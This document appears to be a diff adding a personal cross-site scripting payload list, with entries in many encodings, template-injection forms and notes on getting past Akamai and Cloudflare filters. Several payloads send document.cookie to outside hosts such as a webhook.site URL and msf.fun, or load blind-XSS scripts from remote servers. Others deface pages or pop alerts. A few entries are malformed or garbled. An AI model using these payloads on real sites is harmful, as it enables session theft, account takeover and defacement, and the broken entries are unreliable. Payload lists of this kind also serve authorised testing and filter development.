@@ -1,0 +1,326 @@
+"><img src=x onerror=alert("el-cezeri XSS")>          
+
+A=![]+'';B=!![]+'';C=[][[]]+'';F=[][C[4]+C[5]+A[2]+B[0]+A[4]+B[1]];D=F+'';F[D[3]+D[6]+C[1]+A[3]+B[0]+B[1]+C[0]+D[3]+B[0]+D[6]+B[1]](A[1]+A[2]+A[4]+B[1]+B[0]+'(1)')()  
+
+"});[].map.call`${alert}1`;</script>
+
+‘;%27;alert(%27CanYouPwnMe%27);%27 Entity kodlama varsa bunu dene 
+
+<script>document.write(%27<img%20src="https://webhook.site/ff0d184e-79a2-45bb-9d3b-46ae3268824c/?c=%27%2bdocument.cookie%2b%27"%20/>%27)</script>  (DOMXSS)
+
+<img src=x onerror=alert('XSS')>.png
+
+'-alert(origin)-' -> %27 2 d%61% 6 c%65%72%74%28 6 f%72%69%67%69 6 e %29% 2 d%27
+
+"><script src=https://cezeri.bxss.in></script>
+
+“><SvG On Onload=alert()>
+
+%7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D
+
+<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
+
+<script>eval("al"%2b"ert(1)")</script>
+
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+
+“><sVg/OnLuFy=”X=y”oNloaD=;1^confirm(1)>/``¹//
+
+"><svg onload=confirm(‘XSS’)> = 3 kere encde = %2522%253E%253CsVg%252FOnLuFy%253D%2522X%253Dy%2522oNloaD%253D%253B1%255Econfirm%25281%2529%253E
+
+%3Csvg%20onload=%0Aalert`xss-found`%3E
+
+/path?next=Javascript:top[/al/.source+/ert/.source](document.cookie)
+
+akamai bypass stored xss "><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
+
+?saving_record=FUZZ"><svg onload=alert("hacked")>
+
+.com/?url=%26%2302java%26%23115cript:alert(document.domain)
+
+{{constructor.constructor('alert(document.cookie)')()}}
+
+id=123123 '<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
+
+<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
+
+😂<<sVg/onload😂=/svg/onload=svg/onmouseOver=confirm`1`><!--😂//=
+
+💋img src=x onerror=alert(document.domain)//💛
+
+XSS attack vector for LESS: a{b:`function(){alert(1)}()`;}
+
+?param=style type='text/less'>x{x:`alert(1)`}</style>
+
+<style type='text/x-less'>x{x:`alert(1)`}</style>
+
+after returnUrl == javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
+
+"><script>alert("elcezeri")</script>
+
+</script><img src=xss onerror=alert(1)>
+
+"><img src=x onerror=alert('XSS')>
+
+}}})</script><script>alert(1)</script>
+
+"><script src=https://cezeri.bxss.in>
+
+<svg/On/OnLoAd=confirm(1)>
+
+"><img%20src=x%20onerror=alert%28document.domain%29>%20<"
+
+--><svg%20onload=alert%26%230000000040document.cookie)>
+
+Javascript:alert(document.cookie)
+
+"> ] <img src=x onerror=alert(document.domain)> "> ]<img src=x onerror=alert(document.cookie)>
+
+INJECTION%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
+
+javascript:bing={};[2].find(confirm)
+
+((qwe'"<X</))
+Akamai WAF Bypass
+
+test"<x onauxclick=a=alert,a(domain)>click 
+
+{{constructor.constructor('alert(`XSS`)')()}}
+
+"'<svg/onload=prompt(100);>{{7*7}}
+
+/:1%22%3C! — 3E%3CSvg%20OnLoad=_=confirm,_(document.domain)%3C!
+
+x"><svg%250donload%3D"window%5B%27alert%27%5D(location[%27hostname%27])"
+
+<math><annotation-xml encoding=text/html><![CDATA[></math><!]]>
+
+<script>var name="&quot;-alert``//"</script>
+
+<fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074`/AAAA/`>
+
+a"+autofocus+onfocus%3Dalert%28document.cookie%29>
+
+"><script>alert(1)</script>&s="><script>alert(1)</script> 
+
+<abdool attr=" --- x="=='='onmouseover=confirm`abdool` style="display:block;width:1000px;height:1000px;background:red"> --- ">
+
+
+javascript:%250Aalert(1)
+
+{{}}{{-function(){this.alert(window.open('https://github.com', '_blank', 'top=500,left=200,frame=false,nodeIntegration=no') ))}() }}
+
+javascript:alert(document.location) xss
+
+INJECTION%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
+
+<pre id=p style=background:#000><svg onload='setInterval(n=>{for(o=t++,i=476;i--;o+=i%30?("0o"[c=0|(h=v=>(M=Math).hypot(i/30-8+3*M.sin(t/8/v),i%30/2-7+4*M.cos(t/9/v)))(7)*h(9)*h(6)/32]||".").fontcolor(c>2):"\n");p.innerHTML=o},t=1)'>
+
+
+X-Fowarded-Host:bing.com"><img src/onerror=prompt(document.cookie)>
+
+lll"></script><script>alert('xss');</script><h1>test</h1>
+
+lll-scriptscriptalertxss-script-1
+
+lll"></script><script>alert('xss');</script>
+
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+
+</</script>script> <</svg>svg/onload=alert`xss`>//
+
+<div class="language" style="background-image: url(/BR.svg)"><div>
+https://redacted.com/search?q=a&country=);width:100vw;height:100vh;background-image:url(//myserver/minions.png);/*
+
+%2522%253E%253Csvg%2520onload%253Dalert%2528%2529%253E
+
+{{$on.constructor('alert(1)')()}} 
+
+{{constructor.constructor('alert(1)')()}} 
+
+<input ng-focus=$event.view.alert('XSS) ')> 
+
+{{constructor.constructor('alert(1)')()}} 
+
+<input ng-focus=$event.view.alert('XSS')>
+
++905432109876;phone-context=<script>alert(1)</script>
+
+test6' onclick='alert(6);'
+
+test6' onclick='alert(document.cookie);'
+
+lll-scriptscriptalertxss-script-1
+
+"><HTML onmouSeovEr=confirm(document.cookie)x>
+
+</title><scRipt>alert(0x00C57D)</scRipt>
+
+<iMg src%3dN onerror%3dalert(0x0036A9)>
+
+<iMg src%3dN onerror%3dalert(0x000D98)>
+
+ --><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+ "%3e%3cImG%20sRC=X%20OneRRoR=alert(document.cookie)%20"%3c
+
+ {{constructor.constructor('alert(1)')()}}
+
+ #elementor-action:action=lightbox&settings=eyJ0eXBlIjoibnVsbCIsImh0bWwiOiI8c2NyaXB0PmFsZXJ0KCd4c3MnKTwvc2NyaXB0PiJ9
+
+"\u003e\u003cimg src=1 onerror=alert(0)\u003e
+
+%3c%2fscript%3e%3cscript%3ealert(`XSS`)%3c%2fscript%3ec579g
+
+%2522%253E%253CsVg%252FOnLuFy%253D%2522X%253Dy%2522oNloaD%253D%253B1%255Econfirm%25281%2529%253E
+
+%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%31%29%2f%2f
+
+%2522%2526%2523%2578%2532%2537%253B%253E%253C%2573%2556%2567%252F%256F%256E%256C%256F%2561%2564%253D%2563%256F%256E%2566%2569%2572%256D%2528%2531%2529%253E.
+
++%22+onmouseover=%22alert(document.cookie)%22%3E%3C!--
+
+<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc(`VulneravelXSS`%26%2300000000000000000041//
+
+"%3e%3cImG%20sRC=X%20OneRRoR=alert(document.cookie)%20"%3c
+
+<svg onload="alert(1)" <="" svg=""
+
+(1,alert)(7*7)]
+
+```23%27);}</script><script>confirm(document.domain)</script>//```
+
+\u0022\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
+
+"></title></script><object/data=//14.rs>
+
+
+https://target[.]com/1<img src=x data'a'onerror=alert(domain)>.childrenlist.htm
+
+ttps://target[.]com/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a"
+
+https://target[.]com/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html
+
+"%3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e
+
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+
+"><svg%20onload=alert%26%230000000040"1")>
+
+\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
+
+“><svg/onload=confirm(document.domain);>{{7*7}}
+
+"<form/><!><details/open/ontoggle=alert(document.domain)>"@gmail.com
+
+'"><script src=https://xss.report/c/elcezeri></script>
+
+lll"></script>>alert('xss');</script><h1>test</h1>"test<form/><!><details/open/ontoggle=alert(document.domain)>"
+
+</script><Img Src=OnXSS OnError=confirm(1)>
+
+</script><a"/onmouseover=(confirm)('clodflare-bypass-doskey_history')>click
+
+</script>"><svg%20onload=alert%26%230000000040"1")>
+
+
+&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
+
+"><track/onerror='confirm`1`'>
+
+"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>
+
+"><A%20%252F=""Href=%20JavaScript:k=%27a%27,top[k%2B%27lert%27](origin)>
+
+"><a onmouseover="alert(document.cookie)">
+
+<details/open=/Open/href=/data=;+ontoggle="(alert)(document.domain)
+
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+
+"><svg+onload=alert&#x60"1)
+
+"><svg+onload=alert&amp;#x60"1 
+
+"><svg+onload=alert&amp;#x2B"1 
+
+"><svg+onload=alert&amp;#x5C"1 
+
+"><svg+onload=alert&amp;#x99"1 
+
+"><svg+onload=alert&amp;#x92"1 
+
+"><svg onload=alert&amp;#x27;#x00000040"1")> 
+
+"><svg+onload=alert&amp;#x8F"1 
+
+"><SVG ONLOAD=&#97&#108&#101&#114&#116(&#x64&#x6f&#x63&#x75&#x6d&#x65&#x6e&#x74&#x2e&#x64&#x6f&#x6d&#x61&#x69&#x6e)> 
+
+"><svg+onload=alert&amp;#x45"1 
+
+"><svg onload=alert&#x00000040"1")> 
+
+“><img src=x onerror=prompt(document.domain);>.pdf
+
+<svg onload=alert&#0000000040"1")>
+
+%3Csvg+onload%3Dalert%26%230000000040%221%22)%3E
+
+javascript:alert(document.cookie)
+
+%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt(%27document.domain%27)%3B%3E
+
+%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+';a=prompt,a()//?aspxerrorpath=/MDMServiceConfig%20%3Cimg%20src=1%20onerror=alert(1)%3E%3Cdiv%20style=%22overflow:%20hidden;%20white-space:%20nowrap;%22%3E%3Cmarquee%20style=%22color:red;font-size:50px;%22%20behavior=%22scroll%22%20direction=%22left%22%20scrollamount=%2210%22%3EHACKED%20BY%20%3Cspan%20style=%22color:red;font-size:60px;%22%3E1BR0%3C/span%3E%3C/marquee%3E
+
+<img src=x onerror=alert&#40document.domain&#41>
+
+?sol=confirm?.(1)
+
+“>-setTimeout`\u0028alert(1)\u0029`-’
+
+''"><script>(1)</script><iFrAme/src=jaVascRipt:prompt.valueOf()(1)+class=spider></iFramE>
+
+"><svg/onload=prompt('Supakiad-S. (m3ez)', document.domain)​>
+
+o'"></script><embed src=:alert(1)>{{constructor.constructor('alert(155555)')()}}
+
+><img src=x onerror=alert(document.domain)>
+
+&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
+
+1\47\42\55\55\41\76\74Img\40Src\40OnError\75confirm\140\113\140\76
+
+<br><center><HTMLinjection</</h1></a></center><!--
+
+')"<svg onload="const cred=document.cookie;console.log(new Image().src= http://burpcolab?cookie= +cred)";>
+
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+
+<iframe/onload="var b = 'document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b; this['src']=a">
+
+<audio autoplay onloadstart=this.src='hxxps://msf.fun/?c='+document["cook"+"ie"]' src=x>
+
+<img/src=q onerror='new Functional\ert\1\``'>
+
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+
+[1].map(alert)   or    (alert)(1)
+
+<"><details/open/ontoggle="jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;">XXXXX</a>
+
+[1].find(confirm)
+
+<svg/onload=self[aler%2bt]1>
+
+%22%3E%3Cobject%20data=data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E%3C/object%3E
+
+'-[document.domain].map(alert)-'
+
+https://InvalidURL">"onmouseover=prompt(document.cookie)> 
+
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgvTXJET29TMDIzLyk8L3NjcmlwdD4="></iframe> 
